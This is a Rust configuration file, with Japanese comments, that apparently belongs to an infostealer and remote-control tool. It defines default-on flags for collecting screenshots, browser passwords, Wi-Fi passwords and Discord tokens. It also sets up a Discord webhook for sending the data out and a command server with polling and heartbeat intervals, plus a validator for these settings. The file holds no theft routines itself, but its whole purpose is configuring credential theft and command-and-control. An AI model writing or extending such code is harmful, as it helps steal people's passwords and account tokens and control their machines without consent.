use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Config {
    // Basic
    pub timeout_seconds: u64,

    // Webhook
    pub webhook_url: String,
    pub webhook_type: String,
    pub webhook_enabled: bool,

    // Collection flags (only used ones)
    pub collect_screenshots: bool,
    pub collect_browser_passwords: bool,
    pub collect_wifi_passwords: bool,
    pub collect_discord_tokens: bool,

    // HTTPサーバー通信設定
    pub command_server_url: String,             // コマンドサーバーのURL
    pub command_server_enabled: bool,           // HTTPサーバー通信の有効/無効
    pub command_auth_token: String,             // サーバー認証トークン
    pub command_poll_interval_seconds: u64,     // サーバーポーリング間隔（命令確認）
    pub heartbeat_interval_seconds: u64,        // ハートビート送信間隔
}

impl Default for Config {
    fn default() -> Self {
        Config {
            timeout_seconds: 45,
            webhook_url: "".to_string(),
            webhook_type: "Discord".to_string(),
            webhook_enabled: true,
            collect_screenshots: true,
            collect_browser_passwords: true,
            collect_wifi_passwords: true,
            collect_discord_tokens: true,
            
            // HTTPサーバー通信設定
            command_server_url: "http://localhost:8080".to_string(),
            command_server_enabled: true,
            command_auth_token: "SECURE_TOKEN_32_CHARS_MINIMUM_LEN".to_string(),
            command_poll_interval_seconds: 10,
            heartbeat_interval_seconds: 30,
        }
    }
}

pub fn load_config_or_default() -> Config {
    Config::default()
}

pub fn validate_config(config: &Config) -> Result<(), String> {
    if config.timeout_seconds == 0 {
        return Err("Timeout must be greater than 0".to_string());
    }
    if config.webhook_enabled && config.webhook_url.trim().is_empty() {
        return Err("Webhook is enabled but URL is empty".to_string());
    }
    
    // HTTPサーバー通信の検証
    if config.command_server_enabled {
        if config.command_server_url.trim().is_empty() {
            return Err("Command server URL cannot be empty when server communication is enabled".to_string());
        }
        if !config.command_server_url.starts_with("http://") && !config.command_server_url.starts_with("https://") {
            return Err("Command server URL must start with http:// or https://".to_string());
        }
        if config.command_auth_token.trim().is_empty() {
            return Err("Auth token cannot be empty when server communication is enabled".to_string());
        }
        if config.command_auth_token.len() < 16 {
            return Err("Auth token must be at least 16 characters long".to_string());
        }
        if config.command_poll_interval_seconds < 1 {
            return Err("Poll interval should be at least 1 second".to_string());
        }
        if config.heartbeat_interval_seconds < 1 {
            return Err("Heartbeat interval should be at least 1 second".to_string());
        }
    }
    
    Ok(())
}
